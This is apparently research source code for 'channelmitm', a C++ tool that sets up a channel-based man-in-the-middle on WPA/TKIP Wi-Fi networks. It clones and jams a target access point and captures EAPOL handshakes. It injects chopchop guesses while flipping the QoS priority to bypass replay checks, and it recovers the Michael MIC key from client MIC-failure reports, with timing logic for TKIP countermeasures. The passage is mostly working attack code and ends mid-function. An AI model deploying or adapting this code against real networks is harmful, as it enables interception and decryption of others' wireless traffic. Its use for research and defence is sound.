// FIXME: Fix the timestamp in probe response etc in firmware
// TODO: Do chopchop in reverse direction ?
/**
 * TODO:
 * - On start we can optimize the attack by sending 0..127 to client 1, and 128..255
 *   to client 2. This can also be done during the attack when our injected packet
 *   isn't captured and both devices become available again.
 *
 * Current Optimizations:
 * - We can attack two clients at the same time by exploiting that a frame
 *   with the source address matching the client is ignored. This reduces
 *   the execution in in half. When chopchop executed from left to right,
 *   we need to chop 12 bytes. This means we can execute the attack in 6 minutes.
 * - If we could mitm a third client on another channel (5GHz for example), it
 *   would reduce to 4 minutes. With 4 clients it becomes 3 minutes.
 */
#include <stdio.h>
#include <net/if.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <getopt.h>
#include <signal.h>
#include <stdarg.h>
#include <stdlib.h>

#include <iostream>
#include <sstream>
#include <unordered_map>
#include <set>
#include <iomanip>

#include "ieee80211header.h"
#include "util.h"
#include "osal_wi.h"
#include "pcap.h"
#include "eapol.h"
#include "chopstate.h"
#include "crypto.h"

#include "MacAddr.h"
#include "ClientInfo.h"
#include "SeqnumStats.h"

//#define FIXED_CLIENT_LIST

#ifdef FIXED_CLIENT_LIST
const uint8_t *CLIENTMAC_SAMSUNG = (uint8_t*)"\x00\xc0\xca\x62\xa4\xf6";
const uint8_t *CLIENTMAC_ALFA = (uint8_t*)"\x90\x18\x7c\x6e\x6b\x20";
#endif

static const uint16_t SEQNUM_BEACONCLONE = 0;

// debug logging levels
enum dbg_level {
	/** all actions (except injected probe responses) and Deauth/Deasso's */
	DBG_NORMAL,
	/** all handshake packets (Auth, AssoReq, AssoResp) */
	DBG_INFO,
	/** display all packets (expect ignored seqnums) */
	DBG_VERBOSE,
	/** display ignored seqnums as well */
	DBG_HIVERBOSE
};

// Jamming the beacons means ALL stations will connect through us.
// Jamming probe requests/responses allows use to individually target stations.

// Use Cases:
// - Transparent repeater (original AP still sees all connected clients)
// - Transparent MitM of encrypted connections
//	* Assures all frames are captured by attacker for later cryptanalysis,
//	  traffic analysis, or other signal intelligence. + cite some examples.

char usage[] =

"\n"
"  channelmitm - Mathy Vanhoef\n"
"\n"
"  usage: channelmitm <options>\n"
"\n"
"  Attack options:\n"
"\n"
"      -a interface : Wireless interface on the channel of AP the attack/clone\n"
"      -c interface : Wireless interface on which to clone the AP\n"
"      -s ssid      : SSID of the Access Point (AP) to clone\n"
"\n"
"  Optional parameters:\n"
"\n"
"      -j interace  : Interface used to jam the targeted AP\n"
"      --dual       : Attack two clients simultaneously\n"
"      -x interval  : Inject chopchop'ed packet every given milliseconds\n"
"      -b bssid     : MAC address of target Access Point (AP) to clone\n"
"      -p password  : WPA passphrase to debug our attacks\n"
"      -K           : Dump calculated keys (PMK, PTK, GTK, etc)\n"
"      -d dump.pcap : Dump traffic from cloned AP to clients to .pcap file\n"
"      -v           : Verbosity, display debug messages\n"
"      -vv          : Verbosity, display many debug messages\n"
"      -vvv         : Verbosity, display many debug messages and packet dumps\n"
"      --testmode   : Suffix SSID of the cloned AP with _clone\n"
"      --fast       : Ignore 60 second MIC fail timeout, guess continuously\n"
"      --pdestmac   : Destination MAC of injected ping (device on ethernet)\n"
"      --pdestip    : Destination IP of injected ping (device on ethernet)\n"
"      --pclientip  : IP address of the MitM'd client for injected ping\n"
"\n"
" Improve performance: echo 11 > $DEBUGFS/ieee80211/phyX/ath9k_htc/config_phy\n"
"\n";

/** Attack options */
struct options_t
{
	char interface_ap[128];
	char interface_clone[128];
	char interface_jam[128];

	/** Injected chopchop'ed packet every X milliseconds */
	int chopint;

	uint8_t bssid[6];
	char ssid[128];
	char passphrase[64];
	bool dumpkeys;

	/** channel of the cloned AP */
	int clonechan;
	
	/** when true assume both clients are MitM'ed and attack both */
	bool simul;
	/** when true it changes ssid name of the clone */
	bool testmode;
	/** when true will test ACK generation on different MAC */
	bool fastguess;

	/** 0 is normal, 1 is debug messages, 2 is many debug messages, 3 is also packet dumps */
	int verbosity;
	char pcapfile[256];
} opt;



/** global variables */
struct global_t {
	/** when set to true, exit main loop */
	bool exit;

	uint8_t beaconbuf[2048];
	size_t beaconlen;

	uint8_t proberesp[2048];
	size_t proberesplen;
	uint16_t probeseqnum;

	wi_dev *jam;
	PCAPFILE pcap;

	/** Is the continouos jamming active? */
	bool isjamming;

	ChopState chop;
	struct timespec lastinject;
	int seqnuminject;

	// FIXME: Improve this ...
	/** current addr3 MAC address used in simultaneous attack */
	uint8_t simulcurr[6];
	/** MAC of client 1 we are attacking */
	uint8_t simulmac1[6];
	/** time when client 1 was last attacked */
	struct timespec simulmac1time;
	/** MAC of client 2 we are attacking */
	uint8_t simulmac2[6];
	/** time when client 2 was last attacked */
	struct timespec simulmac2time;

	/** status line displayed below program, overwritten by new status updates */
	char status[1024];	
} global;

SeqnumStats seqstats;
std::unordered_map<
	MacAddr,	// key
	ClientInfo*,	// mapped type
	MacAddr,	// hash
	MacAddr>	// equal operator
	client_list;

ClientInfo * find_client(const ieee80211header *hdr)
{
	const uint8_t *clientmac = NULL;

	if (hdr->fc.tods == 1 && hdr->fc.fromds == 0) {
		clientmac = hdr->addr2;
	} else if (hdr->fc.tods == 0 && hdr->fc.fromds == 1) {
		clientmac = hdr->addr1;
	} else if (hdr->fc.tods == 0 && hdr->fc.fromds == 0) {
		// probe response
		if (hdr->fc.type == TYPE_MNGMT && hdr->fc.subtype == 5)
			clientmac = hdr->addr1;
		// probe request
		else if (hdr->fc.type == TYPE_MNGMT && hdr->fc.subtype == 4)
			clientmac = hdr->addr2;
		else
			return NULL;
	} else {
		std::cerr << __FUNCTION__ << ": Unsupported network mode\n";
		return NULL;
	}

	auto it = client_list.find(MacAddr(clientmac));
	if (it == client_list.end())
		return NULL;

	return it->second;
}

/** To get the GTK keys we just need one client wich has it. FIXME: Make this global AP info... */
ClientInfo * find_gtk_client(const ieee80211header *hdr)
{
	for (auto it = client_list.begin(); it != client_list.end(); ++it)
	{
		if (it->second->keys.state.gtk)
			return it->second;
	}

	return NULL;
}

static std::string currentTime()
{
	time_t now = time(0);
	struct tm tstruct;
	char buf[80];
	tstruct = *localtime(&now);

	// Visit http://en.cppreference.com/w/cpp/chrono/c/strftime
	// for more information about date/time format
	strftime(buf, sizeof(buf), "%X", &tstruct);

	return buf;
}

// FIXME: We should have Dot11 class that does this...
static std::string packet_summary(uint8_t *buf, size_t buflen)
{
	ieee80211header *hdr = (ieee80211header*)buf;
	std::ostringstream ss;

	ss << std::left << std::setw(4) << hdr->sequence.seqnum << "  "
		<< MacAddr(hdr->addr2) << " to "
		<< MacAddr(hdr->addr1) << (hdr->addr1[0] & 1 ? " (B" : " (U")
		<< (hdr->fc.retry ? "R " : "  ") << std::setw(5)
		<< frametype(hdr->fc.type) << " / " << std::setw(10)
		<< framesubtype(hdr->fc.type, hdr->fc.subtype) << ")";

	return ss.str();
}

void clearstatus()
{
	printf("\033[2K\r");
}

void printstatus()
{
	// clear whole line and print status
	clearstatus();
	printf("%s", global.status);
	fflush(stdout);
}


void updatestatus(const char *format, ...)
{
	va_list argptr;
	va_start(argptr, format);
	char line[1024];
	
	vsnprintf(line, sizeof(line), format, argptr);
	snprintf(global.status, sizeof(global.status), ">%s<  %s",
		currentTime().c_str(), line);
	printstatus();

	va_end(argptr);
}

static void print_dbgline(const std::string &iface, bool newseqno, uint8_t *buf,
	size_t len, const std::string &dest, std::ostringstream &dbgout)
{
	ieee80211header *hdr = (ieee80211header*)buf;
	bool shouldoutput = false;

	// handle DBG_INFO and DBG_NORMAL
	switch (opt.verbosity)
	{
	case DBG_INFO:
		// authentication
		if (hdr->fc.type == TYPE_MNGMT && hdr->fc.subtype == 11)
			shouldoutput = true;
		// association request/response, reassocation request/response,
		// probe request/response.
		if (hdr->fc.type == TYPE_MNGMT && hdr->fc.subtype >= 0
			&& hdr->fc.subtype <= 5)
			shouldoutput = true;
		// association response
		if (hdr->fc.type == TYPE_MNGMT && hdr->fc.subtype == 11)
			shouldoutput = true;
	case DBG_NORMAL:
		// output all "actions", except injected probe responses
		if (dbgout.tellp() != 0 && (hdr->fc.type != TYPE_MNGMT || hdr->fc.subtype != 4) )
			shouldoutput = true;
		// deauthentication
		if (hdr->fc.type == TYPE_MNGMT && hdr->fc.subtype == 12)
			shouldoutput = true;
		// disassociation
		if (hdr->fc.type == TYPE_MNGMT && hdr->fc.subtype == 10)
			shouldoutput = true;
	}

	// for DBG_INFO and DBG_NORMAL it must also be a new frame
	shouldoutput = shouldoutput && newseqno;

	// finally handle DBG_HIVERBOSE and DBG_VERBOSE
	switch (opt.verbosity)
	{
	case DBG_VERBOSE:
		shouldoutput = newseqno;
		break;
	case DBG_HIVERBOSE:
		shouldoutput = true;
		break;
	}

	// return if no output should be displayed
	if (!shouldoutput) return;

	// clear whole line
	printf("\033[2K\r");
	
	std::cout << "[" << currentTime() << "]  " << std::left << std::setw(6)
		<< iface << (newseqno ? "   : " : "ign: ")
		<< packet_summary(buf, len);

	if (dest.length() != 0)
		std::cout << " -> " << std::setw(6) << dest;
	else
		std::cout << "          ";

	std::cout << dbgout.str() << std::endl;

	// put status line back
	printstatus();
}


static void printUsage()
{
	printf("%s", usage);
}

bool parseConsoleArgs(int argc, char *argv[])
{
	int option_index = 0;
	int c, rval;

	static struct option long_options[] = {
		{"help",      0, 0, 'h'},
		{"testmode",  0, 0, 't'},
		{"fast",      0, 0, 'F'},
		{"dual",      0, 0, 'S'}
	};

	if (argc <= 1) {
		printUsage();
		return false;
	}

	// default settings
	memset(&opt, 0, sizeof(opt));
	opt.chopint = 100; // inject 10 packets each second

	while ((c = getopt_long(argc, argv, "a:c:s:j:b:p:d:x:thvKFS", long_options, &option_index)) != -1)
	{
		switch (c)
		{
		case 'h':
			printUsage();
			// when help is requested, don't do anything other then displaying the message
			return false;

		case 'a':
			strncpy(opt.interface_ap, optarg, sizeof(opt.interface_ap));
			break;

		case 'c':
			strncpy(opt.interface_clone, optarg, sizeof(opt.interface_clone));
			break;

		case 'j':
			strncpy(opt.interface_jam, optarg, sizeof(opt.interface_jam));
			break;

		case 'x':
			rval = sscanf(optarg, "%d", &opt.chopint);
			if (opt.chopint < 10 || opt.chopint > 30000 || rval != 1) {
				printf("Invalid interval between injected packets. [10-30000]\n");
				return false;
			}
			break;

		case 'b':
			if (!getmac(optarg, opt.bssid)) {
				printf("Failed to parse MAC address '%s' (given by -b)\n", optarg);
				return false;
			}
			break;

		case 'p':
			if (strlen(optarg) > 63) {
				printf("Passphrase can be at most 63 characters\n");
				return false;
			}
			strncpy(opt.passphrase, optarg, sizeof(opt.passphrase));
			opt.passphrase[sizeof(opt.passphrase) - 1] = '\0';
			break;

		case 'd':
			if (strlen(optarg) > sizeof(opt.pcapfile) - 1) {
				printf(".pcap filename is too long\n");
				return false;
			}
			strncpy(opt.pcapfile, optarg, sizeof(opt.pcapfile));
			break;

		case 's':
			strncpy(opt.ssid, optarg, sizeof(opt.ssid));
			break;

		case 't':
			opt.testmode = true;
			break;

		case 'v':
			opt.verbosity++;
			break;

		case 'K':
			opt.dumpkeys = true;
			break;

		case 'F':
			opt.fastguess = true;
			break;

		case 'S':
			opt.simul = true;
			break;

		default:
			printf("Unknown command line option '%c'\n", c);
			return false;
		}
	}

	if (opt.interface_ap[0] == '\x0' || opt.interface_clone[0] == '\x0')
	{
		printf("You must specify two interfaces using -a and -c.\n");
		printf("\"channelmitm --help\" for help.\n");
		return false;
	}


	if (is_empty(opt.bssid, 6) && opt.ssid[0] == '\x0')
	{
		printf("You must specify either a target SSID (-s) or BSSID (-b).\n");
		printf("\"channelmitm --help\" for help.\n");
		return false;
	}

	if (!is_empty(opt.bssid, 6) && opt.ssid[0] != '\x0')
	{
		printf("You can specify both a target SSID (-s) and BSSID (-b)\n");
		return false;
	}


	return true;
}

void dump_buffer(const char *filename, uint8_t *buff, size_t len)
{
	FILE *fp = fopen(filename, "wb");
	if (fp == NULL) {
		fprintf(stderr, "Failed to open %s for writing: ", filename);
		perror("");
		return;
	}

	if (fwrite(buff, len, 1, fp) != 1) {
		fprintf(stderr, "Failed to write to %s: ", filename);
		perror("");
		return;
	}

	fclose(fp);
}

void get_macmask(const uint8_t mac[6], uint8_t mask[6])
{
	memset(mask, 0xFF, 6);

	for (auto it = client_list.begin(); it != client_list.end(); ++it)
	{
		for (int i = 0; i < 6; ++i)
		{
			mask[i] &= ~(mac[i] ^ it->second->mac[i]);
		}
	}
}

void update_ap_macmask(wi_dev *ap)
{
	ClientInfo *client;
	uint8_t macmask[6];

	// get MAC first client
	if (client_list.size() == 0)
		return;
	client = client_list.begin()->second;

	// get mask
	get_macmask(client->mac, macmask);

	// set MAC and mask
	osal_wi_set_mac(ap, client->mac);
	osal_wi_set_macmask(ap, macmask);
}


bool is_probe_resp(uint8_t *buf, size_t len, void *data)
{
	ieee80211header *hdr = (ieee80211header*)buf;
	uint8_t *dest = (uint8_t*)data;

	// probe response
	if (len < sizeof(ieee80211header) || hdr->fc.type != 0 || hdr->fc.subtype != 5)
		return false;

	// from the AP to MAC address we used
	if (memcmp(hdr->addr2, opt.bssid, 6) != 0 || memcmp(hdr->addr1, dest, 6) != 0)
		return false;

	return true;
}


// Note: see IEEE802.11-2012 8.2.4.1.3 for the list of all possible packet types
static bool is_handshake_packet(uint8_t *buf, size_t len)
{
	ieee80211header *hdr = (ieee80211header*)buf;

	if (memcmp(hdr->addr1, "\xFF\xFF\xFF\xFF\xFF\xFF", 6) == 0) {
		// Probe request
		if (hdr->fc.type == TYPE_MNGMT && hdr->fc.subtype == 4)
			return true;
	}
	else {
	}

	return false;
}


void dump_pcap(uint8_t *buf, size_t len)
{
	if (global.pcap)
		pcap_write_packet(global.pcap, buf, len, 0);
}


/**
 * An injected (non-forwared) packet needs to be handled properly
 * so we won't detected it as a new packet when the OS returns it...
 */
int inject_and_dump(wi_dev *dev, uint8_t *buf, size_t len)
{
	if (osal_wi_write(dev, buf, len) < 0) return -1;
	dump_pcap(buf, len);

	// 'register' the packet so it will be detected as a duplicate
	seqstats.is_new(buf, len);

	return 0;
}


bool is_broadcast_data(uint8_t *buf, size_t len)
{
	ieee80211header *hdr = (ieee80211header*)buf;

	if (len < sizeof(ieee80211header))
		return false;

	if (hdr->fc.type != TYPE_DATA)
		return false;

	if (!ieee80211_broadcast_mac(hdr->addr1))
		return false;

	return true;
}


int find_group_message(uint8_t *buf, size_t len, std::ostringstream &dbgout)
{
	uint8_t chopbuf[2024];
	ieee80211header *hdr = (ieee80211header*)buf;
	ClientInfo *client;
	int pos, datalen;
	size_t choplen;

	//
	// 1. filter messages
	//

	// must be to broadcast/multicast data
	if (!is_broadcast_data(buf, len))
		return 0;
	// must be from AP to station
	if (hdr->fc.tods == 1 || hdr->fc.fromds == 0)
		return 0;
	// must be encrypted frame
	if (hdr->fc.protectedframe == 0)
		return 0;
	// TODO: Want ARP request from MiTM'ed station to broadcast address


	// get position of encrypted data
	pos = sizeof(ieee80211header) + sizeof(tkipheader);
	if (ieee80211_dataqos(hdr))
		pos += sizeof(ieee80211qosheader);

	// - ARP requests: should be ff:ff:ff:ff:ff:ff broadcast
	// - Other possible target is Multicast Listener Report Message v2
	datalen = len - pos - sizeof(tkiptail);
	if (datalen != sizeof(llcsnaphdr) + 28)
		return 0;

	// only set chopchop state if still empty	
	if (!global.chop.empty())
		return 0;

	//
	// 2. prepare for chopchop attack
	//

	// If attacking two clients, verify both are already MitM'ed and the EAPOL handshake
	// is complete. Otherwise the newer client will have an updated TSC (on al QoS channels),
	// and may simply not be connected yet!
	if (opt.simul) {
		bool eapoldone = true;

		// check both MitM'ed
		if (client_list.size() != 2) {
			dbgout << " | ign ARP (num)";
			return 0;
		}

		// both must have send EAPOL 4 packets
		auto it = client_list.begin();
		eapoldone = (eapoldone && it->second->keys.lastframenum == 4);
		++it;
		eapoldone = (eapoldone && it->second->keys.lastframenum == 4);
		if (!eapoldone) {
			dbgout << " | ign ARP (eapol)";
			return 0;
		}

		// get MAC addresses of both clients
		it = client_list.begin();
		memcpy(global.simulmac1, it->second->mac, 6);
		++it;
		memcpy(global.simulmac2, it->second->mac, 6);

		// begin by attacking client 1, so set mac of client 2
		memcpy(global.simulcurr, global.simulmac2, 6);
	}

	// include QoS header for chopchop attack
	memcpy(chopbuf, buf, len);
	choplen = add_qos_hdr(chopbuf, len, sizeof(chopbuf));

	// prepare chopchop state
	global.chop.init(chopbuf, choplen);
	dbgout << " | Chop Init";

	// debug attack if we have GTK
	client = find_gtk_client(hdr);
	if (client && client->keys.state.gtk) {
		uint8_t decrypted[1024];

		if (decrypt_tkip(chopbuf, choplen, client->keys.gtk.enc, decrypted)) {
			// debug every guess
			global.chop.set_decrypted(decrypted, choplen);

			clearstatus();
			dump_packet(decrypted, choplen);
			printf("\n\n");
			printstatus();

#if 0
			const uint32_t NUMSIMULATED = 11;

			// set first 11 guesses we we only need to chopchop one byte
			for (size_t i = 0; i < NUMSIMULATED; ++i)
				global.chop.simulate(decrypted[choplen - i - 1]);
			dbgout << " | Simulated " << NUMSIMULATED << "b chop";
#endif

			// FIXME: Need to xor the shizzle
			//global.chop.set_guess( (decrypted[declen - NUMSIMULATED - 1] - 1) % 0x100 );
		} else {
			dbgout << " | GROUP DEC FAIL";
			global.chop.clear();
		}
	}

	return 0;
}


int chopchop_tick(wi_dev *ap, wi_dev *clone)
{
	uint8_t buf[1024];
	uint8_t decrypted[1024];
	ieee80211header *hdr = (ieee80211header*)buf;
	ieee80211qosheader *qoshdr = (ieee80211qosheader*)(hdr + 1);
	ClientInfo *client;
	int len;
	struct timespec now, sendtime, delta;

	if (global.chop.empty())
		return 0;

	// Check if enough time has passed to send new packet
	clock_gettime(CLOCK_MONOTONIC, &now);

	delta.tv_sec = opt.chopint / 1000;
	delta.tv_nsec = (opt.chopint % 1000) * 1000 * 1000;
	sendtime = global.lastinject;
	timespec_add(&sendtime, &delta, &sendtime);
	if (timespec_cmp(&now, &sendtime) < 0)
		return 0;

	global.lastinject = now;

	// get next guess
	global.chop.next_guess();
	len = global.chop.getbuf(buf, sizeof(buf));
	if (len < 0) {
		fprintf(stderr, "Failed to get chopchop buffer\n");
		return -1;
	}

	// change priority of the packet to bypass TSC check
	qoshdr->tid ^= 1;

	// change source address so client will accept its own broadcast packets
	if (opt.simul)
	{
		memcpy(hdr->addr3, global.simulcurr, 6);
	}
	else
	{
		hdr->addr3[5] ^= 0x33;
	}

	// update sequence number
	hdr->sequence.seqnum = ++global.seqnuminject;

	// inject the guess
	if (inject_and_dump(clone, buf, len) < 0) return -1;

	updatestatus("Injected chopchop guess %d from %s", global.chop.get_guess(),
		MacAddr(hdr->addr3).tostring().c_str());

	client = find_gtk_client(hdr);
	if (client && client->keys.state.gtk && decrypt_tkip(buf, len, client->keys.gtk.enc, decrypted)) {
		// keep user informed that correct guess was injected
		clearstatus();
		printf("[%s]  Injecting correct chopchop guess %d from %s\n",
			currentTime().c_str(), global.chop.get_guess(),
			MacAddr(hdr->addr3).tostring().c_str());
		printstatus();
	} else {
		
	}



	return 0;
}


int detect_mic_failure(uint8_t *buf, size_t len, std::ostringstream &dbgout)
{
	ieee80211header *hdr = (ieee80211header*)buf;
	ClientInfo *client;
	int pos, datalen;

	// must be to unicast data
	if (is_broadcast_data(buf, len))
		return 0;
	// must be from station to AP
	if (hdr->fc.tods == 0 || hdr->fc.fromds == 1)
		return 0;
	// must be encrypted frame
	if (hdr->fc.protectedframe == 0)
		return 0;
	// we must actually be attacking
	if (global.chop.empty())
		return 0;

	// get position of encrypted data (tkip header has same size as CCMP header)
	pos = sizeof(ieee80211header) + sizeof(tkipheader);
	if (ieee80211_dataqos(hdr))
		pos += sizeof(ieee80211qosheader);

	// get length of payload - 115 is for CCMP, 119 is for TKIP
	datalen = len - pos;
	if (datalen != 115 && datalen != 119)
		return 0;

	// ----- from here on return 1 so MIC failure is not forwarded -----

	// With multiple clients we can/will get multiple MIC failures. If get_guess returns
	// -1 it means one was already detected, ignore this one. Note that the next guess is
	// set after one minute has passed.
	// FIXME: 
	if (global.chop.get_guess() == -1) {
		dbgout << " | Ignored MIC fail";
		return 1;
	}

	dbgout << " | MIC FAIL " << std::left << std::setw(3) << (int)global.chop.get_guess()
		<< " [" << (global.chop.chopped() + 1) << "/12]";

	// advance chopchop algorithm
	global.chop.advance();

	// if MIC and ICV are chopped, guess plaintext and derive MIC key
	if (global.chop.chopped() == 12)
	{
		uint8_t guesspacket[1024];
		int rval;
		size_t guesslen;
		uint8_t derivedkey[8];

		// predict packet content
		rval = global.chop.guess_arprequest(guesspacket, sizeof(guesspacket));
		if (rval < 0) {
			dbgout << " | Predict FAIL";
			return 0;
		}
		guesslen = (size_t)rval;

		// Dump guessed packet content
		dump_buffer("guessedpacket.bin", guesspacket, rval);

		// dervice MIC key - FIXME: we want to do this in another thread
		calc_michael_key(guesspacket, guesslen, derivedkey);

		// Dump MIC key -- FIXME: Display to screen
		dump_buffer("mickey.bin", derivedkey, 8);

		client = find_gtk_client(hdr);
		if (client && client->keys.state.gtk && memcmp(derivedkey, client->keys.gtk.micfromds, 8) != 0) {
			dbgout << " | Revese MIC FAIL";
			return 1;
		}

		dbgout << " | GOT MIC KEY";

		// clear chop state (avoid from guessing bytes)
		global.chop.clear();
	}
	// manage simultaneous attack against two clients
	else if (opt.simul) {
		// if we are attacking client 1, switch to client 2
		if (memcmp(global.simulcurr, global.simulmac2, 6) == 0) {
			global.simulmac1time = global.lastinject;

			memcpy(global.simulcurr, global.simulmac1, 6);
			global.lastinject = global.simulmac2time;
		}
		// if we are attacking client 2, switch to client 1
		else {
			global.simulmac2time = global.lastinject;

			memcpy(global.simulcurr, global.simulmac2, 6);
			global.lastinject = global.simulmac1time;
		}

		// wait one minute, unless it's the last byte the client needs to attack
		if (global.chop.chopped() >= 10)
			global.lastinject.tv_sec += 1;
		else
			global.lastinject.tv_sec += 61;
	}
	// otherwise pauze execution to avoid TKIP countermeasures
	else
	{
		if (opt.fastguess || global.chop.chopped() >= 11)
			global.lastinject.tv_sec += 1;
		else
			global.lastinject.tv_sec += 61;
	}

	return 1;
}

//
// TODO: Move this to utility file/module
//
struct arping_opt {
	bool tods;

	uint8_t mac_bssid[6];
	uint8_t mac_src[6];
	uint8_t mac_dest[6];

	uint8_t ip_src[4];
	uint8_t ip_dest[4];
};

int build_arping_request(uint8_t *buf, size_t len, const arping_opt &pingopt)
{
	ieee80211header *hdr = (ieee80211header*)buf;
	llcsnaphdr *llcsnap = (llcsnaphdr*)(hdr + 1);
	arppacket *arp = (arppacket*)(llcsnap + 1);
	size_t buflen = sizeof(ieee80211header) + sizeof(llcsnaphdr) + sizeof(arppacket);

	if (len < buflen) {
		fprintf(stderr, "%s: buffer too small (%zu)\n", __FUNCTION__, len);
		return -1;
	}

	memset(hdr, 0, sizeof(*hdr));
	hdr->fc.type = TYPE_DATA;
	hdr->fc.subtype = 0;
	hdr->fc.tods = pingopt.tods;
	
	// TODO: document usage of this global variable
	global.seqnuminject += 1;
	hdr->sequence.seqnum = ++global.seqnuminject;

	if (hdr->fc.tods) {
		memcpy(hdr->addr1, pingopt.mac_bssid, 6);
		memcpy(hdr->addr2, pingopt.mac_src, 6);
		memcpy(hdr->addr3, pingopt.mac_dest, 6);
	} else {
		memcpy(hdr->addr1, pingopt.mac_dest, 6);
		memcpy(hdr->addr2, pingopt.mac_bssid, 6);
		memcpy(hdr->addr3, pingopt.mac_src, 6);
	}

	llcsnap->dsap = 0xAA;
	llcsnap->ssap = 0xAA;
	llcsnap->ctrl = 0x03;
	memset(llcsnap->oui, 0, 3);
	llcsnap->type = htons(0x0806);

	arp->hardwaretype = htons(1); // Ethernet
	arp->protocoltype = htons(0x0800); // IP
	arp->hardwaresize = 6;
	arp->protocolsize = 4;
	arp->opcode = htons(1); // Ping Request
	memcpy(arp->sendermac, pingopt.mac_src, 6);
	memcpy(arp->senderip, pingopt.ip_src, 4);
	memset(arp->targetmac, 0, 6);
	memcpy(arp->targetip, pingopt.ip_dest, 4);

	return buflen;
}


/**
 * Analyzses traffic, and possibly injects packets to perform attacks.
 *
 * The packets given to this function are unique, and are the traffic from
 * clients to the access point and back.
 *
 * Returns values:
 * < 0	error occured
 * = 0	don't forward packet
 * > 0	length of the (possibly modified) packet to forward
 */
int analyze_traffic(wi_dev *ap, wi_dev *clone, uint8_t *buf, size_t *plen, size_t maxlen, std::ostringstream &dbgout)
{
	ieee80211header *hdr = (ieee80211header*)buf;
	ClientInfo *client;

	//
	// 0. Perform basic packet filtering and modification for MitM to properly work
	//

	// do not forward probe responses, we reply ourselves
	if (opt.testmode && hdr->fc.type == TYPE_MNGMT && hdr->fc.subtype == 5)
		return 0;

	// change channel of association responses to channel where the cloned
	// AP is located (beacons and probe request shouldn't get this far).
	beacon_set_chan(buf, *plen, opt.clonechan);

	// fix network name in association request (doesn't contain channel)
	if (opt.testmode && hdr->fc.type == TYPE_MNGMT && hdr->fc.subtype == 0) {
		char ssid[128];
		if (!beacon_get_ssid(buf, *plen, ssid, sizeof(ssid))) {
			std::cout << "Unable to extract SSID:\n";
			dump_packet(buf, *plen);
			std::cout << std::endl;
			return -1;
		}

		if (strncmp(ssid, opt.ssid, strlen(opt.ssid)) == 0) {
			beacon_set_ssid(buf, plen, maxlen, opt.ssid);
			dbgout << ssid << " -> " << opt.ssid;
		}
	}

	//
	// 1. Create a .pcap file of traffic between AP and clients
	//

	dump_pcap(buf, *plen);

	//
	// 2. Check for EAPOL handshake from our targeted client
	//

	// FIXME: Currently EAPOL only works well for WPA2-Personal
	client = find_client(hdr);
	if (client)
	{
		// FIXME: Improve this interface, and the information displayed....
		eapol_update eapol = check_eapol_handshake(&client->keys, buf, *plen);
		if (eapol.framenum)
		{
			//
			// 2a. Display whether we could exract session keys (for debug mode)
			//
			dbgout << " | EAPOL " << (int)eapol.framenum;
			if (eapol.framenum == 2 && client->keys.state.ptk) {
				dbgout << " - PTK ";
				dbgout << (client->keys.valid_ptk ? "OK" : "BAD");
			}
			if (eapol.framenum == 3 && client->keys.state.gtk) {
				// TODO FIXME: Check MIC of Key Data ??? Is that done??
				dbgout << " - GTK ";
				dbgout << (client->keys.valid_ptk ? "OK" : "BAD");
			}
		}
	}

	//
	// 3. Check for Group message from AP to STA
	//

	find_group_message(buf, *plen, dbgout);

	//
	// 4. Dected MIC failures for chopchop attack
	//
	
	// Detect & handle MIC failure. Don't forward it.
	if (detect_mic_failure(buf, *plen, dbgout))
		return 0;

	return 1;
}


/**
 * negative on error
 * 0 when not forwarded
 * 1 when forwarded
 */
int handle_packet_ap(wi_dev *ap, wi_dev *clone, uint8_t *buf, size_t len, size_t maxlen)
{
	ieee80211header *hdr = (ieee80211header*)buf;
	std::ostringstream dbgout;
	int rval;

	// sanity check, don't forward control frames
	if (len < sizeof(ieee80211header) || hdr->fc.type == TYPE_CNTRL)
		return 0;

	// should be from our targeted BSSID
	if (memcmp(hdr->addr2, opt.bssid, 6) != 0)
		return 0;

	// Special case: we inject our own beacons with sequence number 0.
	// So drop *if* this is indeed a beacon.
	if (hdr->sequence.seqnum == SEQNUM_BEACONCLONE && hdr->fc.type == TYPE_MNGMT
		&& hdr->fc.subtype == 8)
		return 0;

	// only forward traffic to MitM'ed client, or broadcast. FIXME: Don't forward probe responses
	auto it = client_list.find(MacAddr(hdr->addr1));
	if (it == client_list.end() && !is_broadcast_data(buf, len))
		return 0;

	// should be a new sequence number, drop old ones
	if (!seqstats.is_new(buf, len)) {
		print_dbgline("AP", false, buf, len, "", dbgout);
		return 0;
	}

	// analyze data between client and AP, forwared if needed
	rval = analyze_traffic(ap, clone, buf, &len, maxlen, dbgout);
	print_dbgline("AP", true, buf, len, rval > 0 ? "CLONE" : "", dbgout);
	if (rval > 0) {
		if (osal_wi_write(clone, buf, len) < 0) return -1;
	}

	return 1;
}


/**
 * negative on error
 * 0 when not forwarded
 * 1 when forwarded
 */
int handle_packet_clone(wi_dev *ap, wi_dev *clone, uint8_t *buf, size_t len, size_t maxlen)
{
	ieee80211header *hdr = (ieee80211header*)buf;
	std::ostringstream dbgout;
	int rval;

	// sanity check, don't forward control frames
	if (len < sizeof(ieee80211header) || hdr->fc.type == TYPE_CNTRL)
		return 0;

	// to our AP, or handshake message
	if (memcmp(opt.bssid, hdr->addr1, 6) != 0 && !is_handshake_packet(buf, len))
		return 0;

#ifndef FIXED_CLIENT_LIST
	// Authentication to our BSSID is considered start to MitM a new client.
	// This assumes no cross-channel talk (not always evident...).
	if (hdr->fc.type == TYPE_MNGMT && hdr->fc.subtype == 11
		&& client_list.find(MacAddr(hdr->addr2)) == client_list.end())
	{
		// add client to MitM'ed list
		ClientInfo *client = new ClientInfo(hdr->addr2);
		client->set_key_info(opt.bssid, opt.passphrase, opt.ssid);
		client_list[MacAddr(hdr->addr2)] = client;

		// update MAC address of interface receiving data from AP
		update_ap_macmask(ap);

		dbgout << " | MiTM'ed ";
	}
#endif

	// only forward to MitM'ed clients, or handle handshake packets
	auto it = client_list.find(MacAddr(hdr->addr2));
	if (it == client_list.end() && !is_handshake_packet(buf, len))
		return 0;

	// drop old packet
	if (!seqstats.is_new(buf, len)) {
		print_dbgline("CLONE", false, buf, len, "", dbgout);
		return 0;
	}

	// drop probe request, reply ourselves. This is handshake stuff, not traffic between
	// client and AP (hence this is handled here and not in analyze_traffic).
	if (hdr->fc.type == TYPE_MNGMT && hdr->fc.subtype == 4) {
		// load example probe response we captured before jamming
		ieee80211header *hdrprobe = (ieee80211header*)global.proberesp;
		ieee802211fixedparams *params = (ieee802211fixedparams*)(global.proberesp + sizeof(ieee80211header));
		struct timespec now;
	
		// set MAC address of client as destination
		memcpy(hdrprobe->addr1, hdr->addr2, 6);

		// update sequence number
